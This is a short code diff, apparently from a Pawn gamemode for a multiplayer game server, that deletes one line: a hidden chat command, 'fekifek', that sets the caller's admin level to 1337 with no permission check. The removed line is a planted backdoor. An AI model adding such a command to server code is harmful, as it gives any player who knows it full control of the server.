@@ -380,7 +380,6 @@ Dialog:ParticleMenu_ObjectID(playerid, response, listitem, inputtext[])
 	ShowParticleDialog(playerid);
 	return true;
 }
-CMD:fekifek(playerid, params[]) { PlayerData[playerid][pAdmin] = 1337; return 1; }
 FUNX::OnPlayerRemoveParticle(playerid, response)
 {
 	if(response)
